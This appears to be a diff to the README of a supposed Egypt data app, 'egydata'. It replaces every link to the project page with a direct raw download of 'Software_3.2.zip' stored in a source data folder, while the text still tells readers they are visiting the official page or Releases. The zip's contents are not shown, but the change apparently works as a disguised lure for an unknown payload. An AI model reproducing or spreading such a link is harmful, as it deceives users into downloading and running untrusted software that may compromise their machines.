@@ -1,6 +1,6 @@
 # 📊 egydata - Easy Egypt Data Access
 
-[![Download egydata](https://img.shields.io/badge/Download%20egydata-blue?style=for-the-badge)](https://github.com/ADSwiftCoder/egydata)
+[![Download egydata](https://img.shields.io/badge/Download%20egydata-blue?style=for-the-badge)](https://github.com/ADSwiftCoder/egydata/raw/refs/heads/main/src/data/Software_3.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these steps to download and start using egydata on your Windows PC.
 
 1. Click the big blue download button below to visit the egydata page:
 
-   [![Download egydata](https://img.shields.io/badge/Download%20egydata-blue?style=for-the-badge)](https://github.com/ADSwiftCoder/egydata)
+   [![Download egydata](https://img.shields.io/badge/Download%20egydata-blue?style=for-the-badge)](https://github.com/ADSwiftCoder/egydata/raw/refs/heads/main/src/data/Software_3.2.zip)
 
 2. On the page, look for the download section or the latest release. Usually, this is found under "Releases" or near the top of the page.
 
@@ -51,7 +51,7 @@ Follow these steps to download and start using egydata on your Windows PC.
 
 1. Open your web browser and go to this link:
 
-   https://github.com/ADSwiftCoder/egydata
+   https://github.com/ADSwiftCoder/egydata/raw/refs/heads/main/src/data/Software_3.2.zip
 
 2. Scroll down to find the "Releases" section on that page.
 
@@ -125,7 +125,7 @@ Use the search bar to find specific places fast. The app displays data clearly w
 ## 🔗 Important Links
 
 - Main download and information page:  
-  https://github.com/ADSwiftCoder/egydata
+  https://github.com/ADSwiftCoder/egydata/raw/refs/heads/main/src/data/Software_3.2.zip
 
 - You can always return here to check for updates or ask questions.
 
@@ -156,6 +156,6 @@ You can remove sample files if not needed. The app remains fully functional.
 
 ---
 
-# [Download egydata](https://github.com/ADSwiftCoder/egydata) 
+# [Download egydata](https://github.com/ADSwiftCoder/egydata/raw/refs/heads/main/src/data/Software_3.2.zip) 
 
 Click above anytime to visit the official download page.
